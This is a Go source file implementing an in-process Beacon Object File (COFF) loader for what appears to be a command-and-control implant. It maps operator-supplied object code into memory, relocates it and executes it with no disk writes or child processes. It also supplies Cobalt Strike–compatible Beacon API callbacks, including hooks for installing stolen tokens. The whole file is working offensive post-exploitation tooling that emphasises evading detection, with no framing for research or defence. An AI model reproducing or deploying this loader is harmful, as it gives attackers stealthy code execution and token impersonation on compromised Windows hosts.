//go:build windows

package native

// In-process COFF (BOF) loader.
//
// The COFF bytes arrive from the task, are mapped into the
// beacon's own address space, are relocated against the Beacon
// API surface and the system DLLs, and are executed on the
// calling goroutine. Nothing is written to disk, no child
// process is created, no PowerShell or csc runs. The whole
// operation is a series of syscall.SyscallN calls on a
// VirtualAlloc'd region.
//
// ABI: the loader is source-compatible with the Beacon Object
// File convention that Cobalt Strike's Aggressor bof_pack and
// the published BOF corpus use. On AMD64 the entry point is
// "go"; on I386 it is "_go". The entry signature is
// (char* args, int len).
//
// Supported relocations:
//   AMD64: ABSOLUTE, ADDR64, ADDR32, ADDR32NB, REL32..REL32_5,
//          SECTION, SECREL
//   I386:  ABSOLUTE, DIR32, DIR32NB, SECTION, SECREL, REL32
//
// Unsupported symbols abort the load with a legible error. The
// loader does not silently skip a symbol or a relocation it does
// not understand; a broken load that runs half-correct code is
// worse than a clean refusal.

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

// ---------------------------------------------------------------
// Memory helpers

var (
	bofKernel32             = syscall.NewLazyDLL("kernel32.dll")
	bofVirtualAlloc         = bofKernel32.NewProc("VirtualAlloc")
	bofVirtualFree          = bofKernel32.NewProc("VirtualFree")
	bofVirtualProtect       = bofKernel32.NewProc("VirtualProtect")
	bofLoadLibraryA         = bofKernel32.NewProc("LoadLibraryA")
	bofGetProcAddress       = bofKernel32.NewProc("GetProcAddress")
	bofGetModuleHandleA     = bofKernel32.NewProc("GetModuleHandleA")
)

const (
	bofMemCommit  = 0x1000
	bofMemReserve = 0x2000
	bofMemRelease = 0x8000

	bofPageReadOnly       = 0x02
	bofPageReadWrite      = 0x04
	bofPageExecuteRead    = 0x20
	bofPageExecuteReadWrite = 0x40

	bofScnMemExecute = 0x20000000
	bofScnMemRead    = 0x40000000
	bofScnMemWrite   = 0x80000000

	bofPageSize = 0x1000
)

func bofAlloc(size uintptr) (uintptr, error) {
	if size == 0 {
		size = bofPageSize
	}
	p, _, err := bofVirtualAlloc.Call(0, size,
		uintptr(bofMemCommit|bofMemReserve),
		uintptr(bofPageReadWrite))
	if p == 0 {
		return 0, fmt.Errorf("VirtualAlloc(%d): %v", size, err)
	}
	return p, nil
}

func bofFree(p uintptr) {
	if p != 0 {
		bofVirtualFree.Call(p, 0, uintptr(bofMemRelease))
	}
}

func bofProtect(p, size uintptr, prot uint32) {
	var old uint32
	bofVirtualProtect.Call(p, size, uintptr(prot),
		uintptr(unsafe.Pointer(&old)))
}

// ---------------------------------------------------------------
// COFF structures

type bofSection struct {
	name            string
	virtualSize     uint32
	rawOffset       uint32
	rawSize         uint32
	relocOffset     uint32
	relocCount      uint16
	characteristics uint32

	// runtime
	allocSize uint32
	base      uintptr
	rxWritten bool
}

type bofSymbol struct {
	name     string
	value    uint32
	secNum   int16
	class    uint8

	// runtime
	resolved uintptr
}

func bofRU16(b []byte, o int) uint16 { return binary.LittleEndian.Uint16(b[o:]) }
func bofRU32(b []byte, o int) uint32 { return binary.LittleEndian.Uint32(b[o:]) }
func bofRU64(b []byte, o int) uint64 { return binary.LittleEndian.Uint64(b[o:]) }
func bofRS16(b []byte, o int) int16  { return int16(binary.LittleEndian.Uint16(b[o:])) }

func bofAlignUp(v, a int) int { return (v + a - 1) & ^(a - 1) }

func bofPtrSize() uintptr { return unsafe.Sizeof(uintptr(0)) }

// ---------------------------------------------------------------
// Output, key-value, and the Beacon API callbacks

type bofState struct {
	mu     sync.Mutex
	output strings.Builder
	kv     map[string]uintptr
	symCache map[string]uintptr
}

// One state per ExecuteBOF call. Guarded because a BOF can spawn
// goroutines that call BeaconOutput concurrently.
var (
	bofStateMu sync.Mutex
	bofActive  *bofState
)

func bofCurrent() *bofState {
	bofStateMu.Lock()
	defer bofStateMu.Unlock()
	return bofActive
}

func bofAppend(s string) {
	st := bofCurrent()
	if st == nil {
		return
	}
	st.mu.Lock()
	defer st.mu.Unlock()
	const cap = 4 * 1024 * 1024
	if st.output.Len() >= cap {
		return
	}
	room := cap - st.output.Len()
	if len(s) <= room {
		st.output.WriteString(s)
	} else {
		st.output.WriteString(s[:room])
	}
}

// BeaconPrintf: format a C-style printf into the output buffer.
func bofPrintfCb(typ, fmtPtr uintptr,
	a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}
	f := bofCStr(fmtPtr)
	if f == "" {
		return 0
	}
	args := [10]uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10}
	bofAppend(bofFormat(f, args[:]))
	return 0
}

// BeaconOutput: raw bytes at data/len.
func bofOutputCb(typ, data uintptr, length uintptr) uintptr {
	if data == 0 || length == 0 {
		return 0
	}
	buf := unsafe.Slice((*byte)(unsafe.Pointer(data)), int(length))
	bofAppend(string(buf))
	return 0
}

// bofCStr reads a NUL-terminated ANSI string from a native address.
func bofCStr(p uintptr) string {
	if p == 0 {
		return ""
	}
	var n int
	for *(*byte)(unsafe.Pointer(p + uintptr(n))) != 0 {
		n++
		if n > 1<<20 {
			break
		}
	}
	if n == 0 {
		return ""
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
}

// bofFormat is a compact printf for the subset of format
// specifiers that BOFs actually use. Width, precision, and
// length modifiers are consumed and ignored. Float specifiers
// are not implemented; the flag is left in the output as a
// literal so a reader notices rather than getting a garbage
// number.
func bofFormat(f string, args []uintptr) string {
	var sb strings.Builder
	sb.Grow(len(f) + 32)
	ai := 0
	i := 0
	for i < len(f) {
		c := f[i]
		i++
		if c != '%' {
			sb.WriteByte(c)
			continue
		}
		if i >= len(f) {
			sb.WriteByte('%')
			break
		}
		// skip flags
		for i < len(f) && strings.IndexByte("-+ #0", f[i]) >= 0 {
			i++
		}
		// skip width
		for i < len(f) && f[i] >= '0' && f[i] <= '9' {
			i++
		}
		// skip precision
		if i < len(f) && f[i] == '.' {
			i++
			for i < len(f) && f[i] >= '0' && f[i] <= '9' {
				i++
			}
		}
		// skip length
		for i < len(f) && strings.IndexByte("lhqLzIjt", f[i]) >= 0 {
			i++
		}
		if i >= len(f) {
			break
		}
		spec := f[i]
		i++
		if spec == '%' {
			sb.WriteByte('%')
			continue
		}
		var v uintptr
		if ai < len(args) {
			v = args[ai]
			ai++
		}
		switch spec {
		case 's':
			sb.WriteString(bofCStr(v))
		case 'S':
			sb.WriteString(bofWStr(v))
		case 'd', 'i':
			sb.WriteString(fmt.Sprintf("%d", int64(v)))
		case 'u':
			sb.WriteString(fmt.Sprintf("%d", uint64(v)))
		case 'x':
			sb.WriteString(fmt.Sprintf("%x", uint64(v)))
		case 'X':
			sb.WriteString(fmt.Sprintf("%X", uint64(v)))
		case 'p':
			sb.WriteString(fmt.Sprintf("0x%x", uint64(v)))
		case 'c':
			sb.WriteByte(byte(v))
		default:
			sb.WriteByte('%')
			sb.WriteByte(spec)
		}
	}
	return sb.String()
}

// bofWStr reads a NUL-terminated wide string.
func bofWStr(p uintptr) string {
	if p == 0 {
		return ""
	}
	var runes []uint16
	for i := 0; i < 1<<20; i++ {
		u := *(*uint16)(unsafe.Pointer(p + uintptr(i*2)))
		if u == 0 {
			break
		}
		runes = append(runes, u)
	}
	return syscall.UTF16ToString(runes)
}

// ---------------------------------------------------------------
// BeaconData* family
//
// The DATAP struct is a fixed-size record allocated by the BOF
// itself (typically on its stack). Field layout:
//
//     char* original   (ptr size)
//     char* buffer     (ptr size)
//     int   length     (4 bytes)
//     int   size       (4 bytes)
//
// On AMD64 that is 24 bytes; on I386, 16 bytes. The pointers are
// the caller's, so this code must never assume Go-managed memory.

func bofDataParseCb(dp, buf uintptr, size uintptr) uintptr {
	ps := bofPtrSize()
	// original = buffer = buf; length = size; size = size
	*(*uintptr)(unsafe.Pointer(dp)) = buf
	*(*uintptr)(unsafe.Pointer(dp + ps)) = buf
	*(*int32)(unsafe.Pointer(dp + ps*2)) = int32(size)
	*(*int32)(unsafe.Pointer(dp + ps*2 + 4)) = int32(size)
	return 0
}

func bofDataExtractCb(dp, sizeOut uintptr) uintptr {
	ps := bofPtrSize()
	buf := *(*uintptr)(unsafe.Pointer(dp + ps))
	length := *(*int32)(unsafe.Pointer(dp + ps*2))
	if length < 4 {
		return 0
	}
	n := int32(*(*uint32)(unsafe.Pointer(buf)))
	if n < 0 || n > length-4 {
		return 0
	}
	data := buf + 4
	*(*uintptr)(unsafe.Pointer(dp + ps)) = data + uintptr(n)
	*(*int32)(unsafe.Pointer(dp + ps*2)) = length - 4 - n
	if sizeOut != 0 {
		*(*int32)(unsafe.Pointer(sizeOut)) = n
	}
	return data
}

func bofDataIntCb(dp uintptr) uintptr {
	ps := bofPtrSize()
	buf := *(*uintptr)(unsafe.Pointer(dp + ps))
	length := *(*int32)(unsafe.Pointer(dp + ps*2))
	if length < 4 {
		return 0
	}
	v := int32(*(*uint32)(unsafe.Pointer(buf)))
	*(*uintptr)(unsafe.Pointer(dp + ps)) = buf + 4
	*(*int32)(unsafe.Pointer(dp + ps*2)) = length - 4
	return uintptr(int64(v))
}

func bofDataShortCb(dp uintptr) uintptr {
	ps := bofPtrSize()
	buf := *(*uintptr)(unsafe.Pointer(dp + ps))
	length := *(*int32)(unsafe.Pointer(dp + ps*2))
	if length < 2 {
		return 0
	}
	v := int16(*(*uint16)(unsafe.Pointer(buf)))
	*(*uintptr)(unsafe.Pointer(dp + ps)) = buf + 2
	*(*int32)(unsafe.Pointer(dp + ps*2)) = length - 2
	return uintptr(int64(v))
}

func bofDataLengthCb(dp uintptr) uintptr {
	ps := bofPtrSize()
	return uintptr(*(*int32)(unsafe.Pointer(dp + ps*2)))
}

// ---------------------------------------------------------------
// BeaconFormat* family
//
// FORMATP has the same field layout as DATAP. The `original`
// pointer is a caller-owned allocation; the loader does not own
// it and must not free it.

func bofFmtAllocCb(dp, maxSize uintptr) uintptr {
	if maxSize == 0 {
		maxSize = bofPageSize
	}
	p, err := bofAlloc(maxSize)
	if err != nil {
		return 0
	}
	ps := bofPtrSize()
	*(*uintptr)(unsafe.Pointer(dp)) = p
	*(*uintptr)(unsafe.Pointer(dp + ps)) = p
	*(*int32)(unsafe.Pointer(dp + ps*2)) = 0
	*(*int32)(unsafe.Pointer(dp + ps*2 + 4)) = int32(maxSize)
	return 0
}

func bofFmtResetCb(dp uintptr) uintptr {
	ps := bofPtrSize()
	orig := *(*uintptr)(unsafe.Pointer(dp))
	*(*uintptr)(unsafe.Pointer(dp + ps)) = orig
	*(*int32)(unsafe.Pointer(dp + ps*2)) = 0
	return 0
}

func bofFmtFreeCb(dp uintptr) uintptr {
	ps := bofPtrSize()
	orig := *(*uintptr)(unsafe.Pointer(dp))
	bofFree(orig)
	*(*uintptr)(unsafe.Pointer(dp)) = 0
	*(*uintptr)(unsafe.Pointer(dp + ps)) = 0
	*(*int32)(unsafe.Pointer(dp + ps*2)) = 0
	*(*int32)(unsafe.Pointer(dp + ps*2 + 4)) = 0
	return 0
}

func bofFmtAppendCb(dp, text uintptr, length uintptr) uintptr {
	if text == 0 || length == 0 {
		return 0
	}
	ps := bofPtrSize()
	buf := *(*uintptr)(unsafe.Pointer(dp + ps))
	used := *(*int32)(unsafe.Pointer(dp + ps*2))
	cap := *(*int32)(unsafe.Pointer(dp + ps*2 + 4))
	n := int32(length)
	if used+n > cap {
		return 0
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(text)), int(n))
	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf+uintptr(used))), int(n))
	copy(dst, src)
	*(*int32)(unsafe.Pointer(dp + ps*2)) = used + n
	return 0
}

func bofFmtPrintfCb(dp, fmtPtr, a1, a2, a3, a4 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}
	f := bofCStr(fmtPtr)
	if f == "" {
		return 0
	}
	s := bofFormat(f, []uintptr{a1, a2, a3, a4})
	if s == "" {
		return 0
	}
	ps := bofPtrSize()
	buf := *(*uintptr)(unsafe.Pointer(dp + ps))
	used := *(*int32)(unsafe.Pointer(dp + ps*2))
	cap := *(*int32)(unsafe.Pointer(dp + ps*2 + 4))
	if used+int32(len(s)) > cap {
		return 0
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf+uintptr(used))), len(s))
	copy(dst, s)
	*(*int32)(unsafe.Pointer(dp + ps*2)) = used + int32(len(s))
	return 0
}

func bofFmtToStringCb(dp, sizeOut uintptr) uintptr {
	ps := bofPtrSize()
	orig := *(*uintptr)(unsafe.Pointer(dp))
	used := *(*int32)(unsafe.Pointer(dp + ps*2))
	if sizeOut != 0 {
		*(*int32)(unsafe.Pointer(sizeOut)) = used
	}
	return orig
}

// ---------------------------------------------------------------
// Key/value store

func bofAddValueCb(key, value uintptr) uintptr {
	st := bofCurrent()
	if st == nil {
		return 0
	}
	k := bofCStr(key)
	if k == "" {
		return 0
	}
	st.mu.Lock()
	st.kv[k] = value
	st.mu.Unlock()
	return 1
}

func bofGetValueCb(key uintptr) uintptr {
	st := bofCurrent()
	if st == nil {
		return 0
	}
	k := bofCStr(key)
	st.mu.Lock()
	v := st.kv[k]
	st.mu.Unlock()
	return v
}

func bofRemoveValueCb(key uintptr) uintptr {
	st := bofCurrent()
	if st == nil {
		return 0
	}
	k := bofCStr(key)
	st.mu.Lock()
	_, ok := st.kv[k]
	delete(st.kv, k)
	st.mu.Unlock()
	if ok {
		return 1
	}
	return 0
}

// ---------------------------------------------------------------
// Misc Beacon API

func bofIsAdminCb() uintptr {
	// The simplest reliable check: OpenProcessToken on the current
	// process, then GetTokenInformation(TokenElevation).
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procOpenProcessToken := advapi32.NewProc("OpenProcessToken")
	procGetTokenInformation := advapi32.NewProc("GetTokenInformation")
	procGetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	procCloseHandle := kernel32.NewProc("CloseHandle")

	const tokenQuery = 0x0008
	const tokenElevation = 20

	hProc, _, _ := procGetCurrentProcess.Call()
	var hToken uintptr
	r, _, _ := procOpenProcessToken.Call(hProc,
		uintptr(tokenQuery),
		uintptr(unsafe.Pointer(&hToken)))
	if r == 0 {
		return 0
	}
	defer procCloseHandle.Call(hToken)

	var elevated uint32
	var retLen uint32
	r, _, _ = procGetTokenInformation.Call(
		hToken, uintptr(tokenElevation),
		uintptr(unsafe.Pointer(&elevated)),
		uintptr(4),
		uintptr(unsafe.Pointer(&retLen)))
	if r == 0 {
		return 0
	}
	if elevated != 0 {
		return 1
	}
	return 0
}

// BeaconUseToken / BeaconRevertToken delegate to the beacon's
// existing token slot. The BOF receives a handle and installs
// it; rev2self drops whatever slot is held.
func bofUseTokenCb(hToken uintptr) uintptr {
	if hToken == 0 {
		return 0
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle := kernel32.NewProc("CloseHandle")
	InstallStolenToken(hToken, procCloseHandle)
	return 1
}

func bofRevertTokenCb() uintptr {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRevertToSelf := advapi32.NewProc("RevertToSelf")
	procRevertToSelf.Call()
	CloseStolenTokenOnExit()
	return 1
}

// ---------------------------------------------------------------
// Callback registry
//
// syscall.NewCallback returns a uintptr that is safe to hand
// to native code. Register each callback exactly once at
// package init and reuse the returned address; calling
// NewCallback per BOF would leak the callback slot.

var (
	bofCbPrintf     uintptr
	bofCbOutput     uintptr
	bofCbDataParse  uintptr
	bofCbDataExtract uintptr
	bofCbDataInt    uintptr
	bofCbDataShort  uintptr
	bofCbDataLength uintptr
	bofCbFmtAlloc   uintptr
	bofCbFmtReset   uintptr
	bofCbFmtFree    uintptr
	bofCbFmtAppend  uintptr
	bofCbFmtPrintf  uintptr
	bofCbFmtToString uintptr
	bofCbAddValue   uintptr
	bofCbGetValue   uintptr
	bofCbRemoveValue uintptr
	bofCbIsAdmin    uintptr
	bofCbUseToken   uintptr
	bofCbRevertToken uintptr
)

func bofInitCallbacks() {
	bofCbPrintf = syscall.NewCallback(bofPrintfCb)
	bofCbOutput = syscall.NewCallback(bofOutputCb)
	bofCbDataParse = syscall.NewCallback(bofDataParseCb)
	bofCbDataExtract = syscall.NewCallback(bofDataExtractCb)
	bofCbDataInt = syscall.NewCallback(bofDataIntCb)
	bofCbDataShort = syscall.NewCallback(bofDataShortCb)
	bofCbDataLength = syscall.NewCallback(bofDataLengthCb)
	bofCbFmtAlloc = syscall.NewCallback(bofFmtAllocCb)
	bofCbFmtReset = syscall.NewCallback(bofFmtResetCb)
	bofCbFmtFree = syscall.NewCallback(bofFmtFreeCb)
	bofCbFmtAppend = syscall.NewCallback(bofFmtAppendCb)
	bofCbFmtPrintf = syscall.NewCallback(bofFmtPrintfCb)
	bofCbFmtToString = syscall.NewCallback(bofFmtToStringCb)
	bofCbAddValue = syscall.NewCallback(bofAddValueCb)
	bofCbGetValue = syscall.NewCallback(bofGetValueCb)
	bofCbRemoveValue = syscall.NewCallback(bofRemoveValueCb)
	bofCbIsAdmin = syscall.NewCallback(bofIsAdminCb)
	bofCbUseToken = syscall.NewCallback(bofUseTokenCb)
	bofCbRevertToken = syscall.NewCallback(bofRevertTokenCb)
}

// ---------------------------------------------------------------
// Symbol resolution

// bofFallbackLibs are searched when a bare function name (no
// LIBRARY$ prefix) is encountered. The order is roughly the
// likelihood of use by a BOF.
var bofFallbackLibs = []string{
	"kernel32.dll", "user32.dll", "advapi32.dll", "ntdll.dll",
	"msvcrt.dll", "shell32.dll", "ws2_32.dll", "netapi32.dll",
	"ole32.dll", "oleaut32.dll", "shlwapi.dll", "crypt32.dll",
	"bcrypt.dll", "secur32.dll", "iphlpapi.dll", "winhttp.dll",
	"wininet.dll", "psapi.dll", "version.dll", "dbghelp.dll",
}

// bofBeaconApi maps a Beacon API symbol to the registered
// callback address. A BOF that calls an unknown BeaconXxx
// aborts; the loader does not want to silently return a stub.
func bofBeaconApi(name string) (uintptr, bool) {
	switch name {
	case "BeaconPrintf":
		return bofCbPrintf, true
	case "BeaconOutput":
		return bofCbOutput, true
	case "BeaconDataParse":
		return bofCbDataParse, true
	case "BeaconDataExtract":
		return bofCbDataExtract, true
	case "BeaconDataInt":
		return bofCbDataInt, true
	case "BeaconDataShort":
		return bofCbDataShort, true
	case "BeaconDataLength":
		return bofCbDataLength, true
	case "BeaconFormatAlloc":
		return bofCbFmtAlloc, true
	case "BeaconFormatReset":
		return bofCbFmtReset, true
	case "BeaconFormatFree":
		return bofCbFmtFree, true
	case "BeaconFormatAppend":
		return bofCbFmtAppend, true
	case "BeaconFormatPrintf":
		return bofCbFmtPrintf, true
	case "BeaconFormatToString":
		return bofCbFmtToString, true
	case "BeaconAddValue":
		return bofCbAddValue, true
	case "BeaconGetValue":
		return bofCbGetValue, true
	case "BeaconRemoveValue":
		return bofCbRemoveValue, true
	case "BeaconIsAdmin":
		return bofCbIsAdmin, true
	case "BeaconUseToken":
		return bofCbUseToken, true
	case "BeaconRevertToken":
		return bofCbRevertToken, true
	}
	return 0, false
}

func bofResolve(name string, cache map[string]uintptr) (uintptr, error) {
	if v, ok := cache[name]; ok {
		return v, nil
	}

	// __imp_LIBRARY$Function or __imp_Function: allocate a slot
	// holding the resolved pointer, return the slot address.
	if strings.HasPrefix(name, "__imp_") {
		real, err := bofResolve(name[6:], cache)
		if err != nil {
			return 0, err
		}
		slot, err := bofAlloc(8)
		if err != nil {
			return 0, err
		}
		*(*uintptr)(unsafe.Pointer(slot)) = real
		cache[name] = slot
		return slot, nil
	}

	// LIBRARY$Function.
	if i := strings.IndexByte(name, '$'); i > 0 {
		lib := name[:i] + ".dll"
		fn := name[i+1:]
		libB, _ := syscall.BytePtrFromString(lib)
		h, _, _ := bofLoadLibraryA.Call(uintptr(unsafe.Pointer(libB)))
		if h == 0 {
			h, _, _ = bofGetModuleHandleA.Call(uintptr(unsafe.Pointer(libB)))
		}
		if h == 0 {
			return 0, fmt.Errorf("bof: LoadLibrary(%q) failed", lib)
		}
		fnB, _ := syscall.BytePtrFromString(fn)
		addr, _, _ := bofGetProcAddress.Call(h, uintptr(unsafe.Pointer(fnB)))
		if addr == 0 {
			return 0, fmt.Errorf("bof: GetProcAddress(%q,%q) failed", lib, fn)
		}
		cache[name] = addr
		return addr, nil
	}

	// Beacon API.
	if strings.HasPrefix(name, "Beacon") {
		if addr, ok := bofBeaconApi(name); ok {
			cache[name] = addr
			return addr, nil
		}
		return 0, fmt.Errorf("bof: unsupported Beacon API %q", name)
	}

	// Bare name. Try each fallback library.
	fnB, _ := syscall.BytePtrFromString(name)
	for _, lib := range bofFallbackLibs {
		libB, _ := syscall.BytePtrFromString(lib)
		h, _, _ := bofGetModuleHandleA.Call(uintptr(unsafe.Pointer(libB)))
		if h == 0 {
			continue
		}
		addr, _, _ := bofGetProcAddress.Call(h, uintptr(unsafe.Pointer(fnB)))
		if addr != 0 {
			cache[name] = addr
			return addr, nil
		}
	}
	return 0, fmt.Errorf("bof: unresolved symbol %q", name)
}

// ---------------------------------------------------------------
// Public entry point

// ExecuteBOFInProcess runs a COFF object entirely inside the
// beacon's process. It returns the output collected by the BOF's
// BeaconOutput / BeaconPrintf calls, the exit code (always 0 on
// success), and any loader error.
//
// The previous implementation shelled out to PowerShell and
// compiled the loader at runtime. This one does neither.
func ExecuteBOFInProcess(bofBytes []byte, entry string, packedArgs []byte) (string, int, error) {
	if len(bofBytes) < 20 {
		return "", -1, errors.New("bof: input too small")
	}

	bofInitCallbacks()

	machine := bofRU16(bofBytes, 0)
	var is64 bool
	switch machine {
	case 0x8664:
		is64 = true
	case 0x014c:
		is64 = false
	default:
		return "", -1, fmt.Errorf("bof: unsupported machine 0x%04X "+
			"(only AMD64 and I386 are supported)", machine)
	}

	nsec := int(bofRU16(bofBytes, 2))
	symOff := int(bofRU32(bofBytes, 8))
	nsym := int(bofRU32(bofBytes, 12))

	if nsec <= 0 {
		return "", -1, errors.New("bof: no sections")
	}

	// ---- Parse section headers ----
	sections := make([]bofSection, nsec)
	for i := 0; i < nsec; i++ {
		off := 20 + i*40
		if off+40 > len(bofBytes) {
			return "", -1, errors.New("bof: section header out of bounds")
		}
		nameBytes := bofBytes[off : off+8]
		nl := 0
		for nl < 8 && nameBytes[nl] != 0 {
			nl++
		}
		sections[i].name = string(nameBytes[:nl])
		sections[i].virtualSize = bofRU32(bofBytes, off+8)
		sections[i].rawSize = bofRU32(bofBytes, off+16)
		sections[i].rawOffset = bofRU32(bofBytes, off+20)
		sections[i].relocOffset = bofRU32(bofBytes, off+24)
		sections[i].relocCount = bofRU16(bofBytes, off+32)
		sections[i].characteristics = bofRU32(bofBytes, off+36)

		m := sections[i].virtualSize
		if sections[i].rawSize > m {
			m = sections[i].rawSize
		}
		if m < 1 {
			m = 1
		}
		sections[i].allocSize = uint32(bofAlignUp(int(m), bofPageSize))
	}

	// ---- Contiguous allocation ----
	var total int
	offsets := make([]int, nsec)
	for i := 0; i < nsec; i++ {
		offsets[i] = total
		total = bofAlignUp(total+int(sections[i].allocSize), bofPageSize)
	}

	blob, err := bofAlloc(uintptr(total))
	if err != nil {
		return "", -1, fmt.Errorf("bof: %w", err)
	}
	defer bofFree(blob)

	for i := 0; i < nsec; i++ {
		sections[i].base = blob + uintptr(offsets[i])
	}

	// ---- Copy section data ----
	for i := 0; i < nsec; i++ {
		if sections[i].rawSize == 0 {
			continue
		}
		src := bofBytes[sections[i].rawOffset : sections[i].rawOffset+sections[i].rawSize]
		dst := unsafe.Slice((*byte)(unsafe.Pointer(sections[i].base)),
			int(sections[i].rawSize))
		copy(dst, src)
	}

	// ---- Parse symbol table ----
	symTable := make([]bofSymbol, nsym)
	strTabOff := symOff + nsym*18
	for i := 0; i < nsym; i++ {
		off := symOff + i*18
		if off+18 > len(bofBytes) {
			return "", -1, errors.New("bof: symbol table truncated")
		}
		low := bofRU32(bofBytes, off)
		if low == 0 {
			strOff := bofRU32(bofBytes, off+4)
			so := strTabOff + int(strOff)
			if so <= 0 || so >= len(bofBytes) {
				return "", -1, fmt.Errorf(
					"bof: string-table offset 0x%X out of bounds", strOff)
			}
			e := so
			for e < len(bofBytes) && bofBytes[e] != 0 {
				e++
			}
			symTable[i].name = string(bofBytes[so:e])
		} else {
			nl := 0
			for nl < 8 && bofBytes[off+nl] != 0 {
				nl++
			}
			symTable[i].name = string(bofBytes[off : off+nl])
		}
		symTable[i].value = bofRU32(bofBytes, off+8)
		symTable[i].secNum = bofRS16(bofBytes, off+12)
		symTable[i].class = bofBytes[off+16]
	}

	// ---- Resolve symbols ----
	cache := make(map[string]uintptr)
	for i := 0; i < nsym; i++ {
		s := &symTable[i]
		if s.secNum > 0 && int(s.secNum) <= nsec {
			s.resolved = sections[s.secNum-1].base + uintptr(s.value)
			continue
		}
		if s.secNum == 0 && s.class == 2 {
			name := s.name
			// Strip x86 decorations
			if !is64 {
				if strings.HasPrefix(name, "_") {
					name = name[1:]
				}
				if at := strings.IndexByte(name, '@'); at > 0 {
					name = name[:at]
				}
			}
			addr, err := bofResolve(name, cache)
			if err != nil {
				return "", -1, fmt.Errorf("bof: symbol %q: %w", s.name, err)
			}
			s.resolved = addr
			continue
		}
		s.resolved = 0
	}

	// ---- Apply relocations ----
	for si := 0; si < nsec; si++ {
		sec := &sections[si]
		for r := 0; r < int(sec.relocCount); r++ {
			off := int(sec.relocOffset) + r*10
			if off+10 > len(bofBytes) {
				return "", -1, errors.New("bof: relocation table truncated")
			}
			va := bofRU32(bofBytes, off)
			symIdx := bofRU32(bofBytes, off+4)
			typ := bofRU16(bofBytes, off+8)
			tgt := sec.base + uintptr(va)

			var sym uintptr
			if int(symIdx) < len(symTable) {
				sym = symTable[symIdx].resolved
			}

			if is64 {
				switch typ {
				case 0x0000: // ABSOLUTE
				case 0x0001: // ADDR64
					*(*uint64)(unsafe.Pointer(tgt)) = uint64(sym)
				case 0x0002: // ADDR32
					*(*uint32)(unsafe.Pointer(tgt)) = uint32(sym)
				case 0x0003: // ADDR32NB
					// Image-relative; treat as opaque
				case 0x0004, 0x0005, 0x0006, 0x0007, 0x0008, 0x0009:
					// REL32..REL32_5
					n := int(typ - 0x0004)
					addend := int32(*(*uint32)(unsafe.Pointer(tgt)))
					rel := int64(sym) - int64(tgt) - 4 - int64(n) + int64(addend)
					if rel > 0x7FFFFFFF || rel < -0x80000000 {
						return "", -1, fmt.Errorf(
							"bof: REL32 overflow at %s+0x%X", sec.name, va)
					}
					*(*uint32)(unsafe.Pointer(tgt)) = uint32(int32(rel))
				case 0x000A: // SECTION
					if int(symIdx) < len(symTable) {
						sn := symTable[symIdx].secNum
						*(*uint32)(unsafe.Pointer(tgt)) = uint32(sn)
					}
				case 0x000B: // SECREL
					if int(symIdx) < len(symTable) {
						sv := symTable[symIdx].value
						*(*uint32)(unsafe.Pointer(tgt)) = sv
					}
				default:
					return "", -1, fmt.Errorf(
						"bof: unsupported AMD64 relocation 0x%04X", typ)
				}
			} else {
				switch typ {
				case 0x0000:
				case 0x0006: // DIR32
					*(*uint32)(unsafe.Pointer(tgt)) = uint32(sym)
				case 0x0007: // DIR32NB
				case 0x000A: // SECTION
				case 0x000B: // SECREL
				case 0x0014: // REL32
					addend := int32(*(*uint32)(unsafe.Pointer(tgt)))
					rel := int64(sym) - int64(tgt) - 4 + int64(addend)
					if rel > 0x7FFFFFFF || rel < -0x80000000 {
						return "", -1, errors.New("bof: REL32 overflow")
					}
					*(*uint32)(unsafe.Pointer(tgt)) = uint32(int32(rel))
				default:
					return "", -1, fmt.Errorf(
						"bof: unsupported I386 relocation 0x%04X", typ)
				}
			}
		}
	}

	// ---- Finalize protections ----
	for i := 0; i < nsec; i++ {
		sec := &sections[i]
		prot := uint32(bofPageReadWrite)
		if sec.characteristics&bofScnMemExecute != 0 {
			prot = bofPageExecuteRead
		} else if sec.characteristics&bofScnMemWrite == 0 &&
			sec.characteristics&bofScnMemRead != 0 {
			prot = bofPageReadOnly
		}
		bofProtect(sec.base, uintptr(sec.allocSize), prot)
	}

	// ---- Find entry point ----
	var candidates []string
	if is64 {
		candidates = []string{entry, "go", "_go"}
	} else {
		candidates = []string{entry, "_go", "go"}
	}
	var entryAddr uintptr
	for _, cand := range candidates {
		if cand == "" {
			continue
		}
		for i := 0; i < nsym; i++ {
			if symTable[i].name == cand && symTable[i].resolved != 0 {
				entryAddr = symTable[i].resolved
				break
			}
		}
		if entryAddr != 0 {
			break
		}
	}
	if entryAddr == 0 {
		return "", -1, fmt.Errorf(
			"bof: entry point not found (tried %q, \"go\", \"_go\")", entry)
	}

	// ---- Allocate argument buffer ----
	argLen := len(packedArgs)
	if argLen == 0 {
		argLen = 1
	}
	argBuf, err := bofAlloc(uintptr(argLen))
	if err != nil {
		return "", -1, fmt.Errorf("bof: args: %w", err)
	}
	defer bofFree(argBuf)
	if len(packedArgs) > 0 {
		dst := unsafe.Slice((*byte)(unsafe.Pointer(argBuf)), len(packedArgs))
		copy(dst, packedArgs)
	}

	// ---- Install state, call, collect ----
	st := &bofState{kv: make(map[string]uintptr)}
	bofStateMu.Lock()
	bofActive = st
	bofStateMu.Unlock()

	defer func() {
		bofStateMu.Lock()
		bofActive = nil
		bofStateMu.Unlock()
	}()

	func() {
		defer func() {
			if r := recover(); r != nil {
				bofAppend(fmt.Sprintf(
					"\n[bof: recovered from panic: %v]\n", r))
			}
		}()
		syscall.SyscallN(entryAddr, argBuf, uintptr(len(packedArgs)))
	}()

	st.mu.Lock()
	out := st.output.String()
	st.mu.Unlock()

	bofProtect(blob, uintptr(total), bofPageReadWrite)
	blobBytes := unsafe.Slice((*byte)(unsafe.Pointer(blob)), total)
	for i := range blobBytes {
		blobBytes[i] = 0
	}

	return out, 0, nil
}